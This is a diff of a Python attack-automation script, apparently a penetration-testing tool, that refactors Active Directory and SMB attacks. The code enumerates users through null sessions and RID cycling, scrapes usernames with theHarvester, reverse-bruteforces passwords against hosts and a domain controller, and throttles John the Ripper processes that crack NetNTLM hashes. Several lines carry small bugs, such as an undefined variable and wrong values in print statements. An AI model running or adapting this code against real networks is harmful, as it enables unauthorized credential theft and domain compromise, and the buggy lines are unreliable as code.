@@ -311,22 +311,6 @@ def get_hosts(args, report):
 
     return hosts, DCs
 
-#def coros_pool(worker_count, commands):
-#    '''
-#    A pool without a pool library
-#    '''
-#    coros = []
-#    if len(commands) > 0:
-#        while len(commands) > 0:
-#            for i in range(worker_count):
-#                # Prevents crash if [commands] isn't divisible by worker count
-#                if len(commands) > 0:
-#                    cmd = commands.pop()
-#                    coros.append(get_output(cmd))
-#                else:
-#                    return coros
-#    return coros
-
 @asyncio.coroutine
 def get_output(cmd):
     '''
@@ -573,7 +557,7 @@ def parse_brute_output(brute_output, prev_creds):
 
     return prev_creds
 
-def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
+def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users, DCs):
     '''
     Performs SMB reverse brute
     '''
@@ -590,13 +574,13 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     print_info('Example command that will run: '+dom_cmds[0].split('&& ')[1])
 
     rpc_output = async_get_outputs(loop, dom_cmds)
+
     if rpc_output:
 
         # {ip:'domain_name', 'domain_sid'}
-        null_sess_hosts = get_null_sess_hosts(rpc_output) #1111 why is this chunk and not just null_sess_hosts
+        null_sess_hosts = get_null_sess_hosts(rpc_output)
 
         # Create master list of null session hosts
-        #null_sess_hosts.update(chunk_null_sess_hosts)
         if len(null_sess_hosts) == 0:
             print_bad('No null SMB sessions available')
         else:
@@ -608,11 +592,7 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
             domains = get_AD_domains(null_sess_hosts)
 
             # Gather usernames using ridenum.py
-            print_info('Checking for usernames. This may take a bit...')
-            ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
-            ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
-            print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
-            ridenum_output = async_get_outputs(loop, ridenum_cmds)
+            ridenum_output = do_ridenum(loop, null_hosts)
 
             # ip_users = {ip:[username, username2], ip2:[username, username2]}
             ip_users, prev_users = get_usernames(ridenum_output, prev_users)
@@ -621,16 +601,15 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
 
     # Do theHarvester for username collection
     if args.domain:
+        print_info('Attempting to scrape usernames from {}'.format(args.domain))
         ip_users, prev_users = run_theHarvester(ip_users, prev_users, null_sess_hosts, args.domain, hosts[0].address, DCs)
 
     if len(ip_users) > 0:
         # Creates a list of unique commands which only tests
         # each username/password combo 2 times and not more
         brute_cmds = create_brute_cmds(ip_users, passwords)
-        if args.password_list:
-            print_info('Checking the passwords in {} against the users'.format(args.password_list))
-        else:
-            print_info('Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
+
+        rev_brute_msgs(ip_users, args, passwords)
 
         brute_output = async_get_outputs(loop, brute_cmds)
 
@@ -638,31 +617,79 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
 
     return prev_creds, prev_users, domains
 
+def do_ridenum(loop, null_hosts):
+    '''
+    Runs and gathers the output from ridenum
+    '''
+    print_info('Checking for usernames. This may take a bit...')
+    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
+    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
+    print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
+    ridenum_output = async_get_outputs(loop, ridenum_cmds)
+    return ridenum_output
+
+def rev_brute_msgs(ip_users, args, passwords):
+    '''
+    Messages printed to output about details of reverse bruteforce
+    '''
+    rev_brute_msg = 'Reverse bruteforcing with the passwords '
+    if args.password_list:
+        print_info(rev_brute_msg + 'in {}'.format(args.password))
+    else:
+        print_info(rev_brute_msg + '{} and {}'.format(passwords[0], passwords[1]))
+
+    print_info('Testing users against one of the following IPs:'.format(args.password_list))
+    for ip in ip_users:
+        print_info('    {}'.format(ip))
+
 def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host, DCs):
     '''
     Run theHarvester to collect more potential usernames
     '''
     users = []
     cmd = 'python2 submodules/theHarvester/theHarvester.py -d {} -b all'.format(domain)
+    rid_users = False
+    unallowed_AD_chars = ['/','\\','[',']',':',';','|','=','+','*','?','<','>','"','@']
+    if len(ip_users) > 0:
+        rid_users = True
     proc = run_proc(cmd)
+    proc.wait()
 
     with open('logs/theHarvester.py.log', 'r') as f:
         lines = f.readlines()
 
     for l in lines:
+
         if '@' in l and 'cmartorella@edge-security.com' not in l:
 
             user = l.split('@')[0]
+
+            # make sure no unallowed AD username character is in the web scraped user
+            if any(char in unallowed_AD_chars for char in user):
+                continue
+            # Max SAM-Account-Name length is 20
+            if len(user) > 20:
+                continue
+
             if user not in prev_users:
                 prev_users.append(user)
-                print_good('Potential user found: {}'.format(dom_user))
+                users.append(user)
+                print_good('Potential user found: {}'.format(user))
 
             # First check if we ID'd any DCs
-            # If so, brute them because they don't require knowledge of the domain name
-            if len(DCs) > 0: #111
+            # If so, brute one because they don't require knowledge of the domain name
+            if len(DCs) > 0:
+                # Just grab the first DC we found
+                # Ideally we'd run this against every DC with a different domain but
+                # hard to make that work without prior knowledge of what the domains are named
+                ip = DCs[0].address
+                if ip_users.get(ip):
+                    ip_users[ip].append(user)
+                else:
+                    ip_users[ip] = [user]
 
             # If we have AD domains found but no DCs, use them so user = DOM\user
-            if len(null_sess_hosts) > 0:
+            elif len(null_sess_hosts) > 0:
                 for key,val in null_sess_hosts.items():
                     ip = key
                     dom = val[0]
@@ -683,6 +710,9 @@ def run_theHarvester(ip_users, prev_users, null_sess_hosts, domain, host, DCs):
                     ip_users[host].append(user)
                 else:
                     ip_users[host] = [user]
+
+    if len(users) == 0:
+        print_bad('No potential usernames found on {}'.format(args.domain))
 
     return ip_users, prev_users
 
@@ -810,18 +840,42 @@ def crack_hashes(hashes):
             filepath = hash_folder+'/{}-hashes-{}.txt'.format(hash_type, identifier)
             for h in hashes[hash_type]:
                 write_to_file(filepath, h, 'a+')
+
+            # Limit hash cracking to 10 instances of JTR at a time
+            num_john_procs = get_running_john_procs()
+            if num_john_procs > 10:
+                continue
+
             if 'v1' in hash_type:
                 hash_format = 'netntlm'
             elif 'v2' in hash_type:
                 hash_format = 'netntlmv2'
             john_cmd = create_john_cmd(hash_format, filepath)
-            try:
-                john_proc = run_proc(john_cmd)
-            except FileNotFoundError:
-                print_bad('Error running john for password cracking, try: cd submodules/JohnTheRipper/src && ./configure && make')
+            john_proc = run_proc(john_cmd)
             procs.append(john_proc)
 
     return procs
+
+def get_running_john_procs():
+    '''
+    Gets number of currently running john procs
+    '''
+    num_john_procs = 0
+
+    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
+
+    for pid in pids:
+        try:
+            proc_cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read().decode('utf8')
+            proc_cmd = proc_cmd.replace('\x00',' ')
+            if 'submodules/JohnTheRipper/run/john --format=netntlm' in proc_cmd:
+                num_john_procs += 1
+
+        # proc has already terminated
+        except IOError:
+            continue
+
+    return num_john_procs
 
 def parse_john_show(out, prev_creds):
     '''
@@ -1367,10 +1421,12 @@ def main(report, args):
 
         for h in hosts:
             print_good('SMB open: {}'.format(h.address))
+        for dc in DCs:
+            print_good('Domain controller found: {}'.format(h.address))
 
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
-            prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
+            prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users, DCs)
         loop.close()
 
         # ATTACK 2: SCF file upload to writeable shares
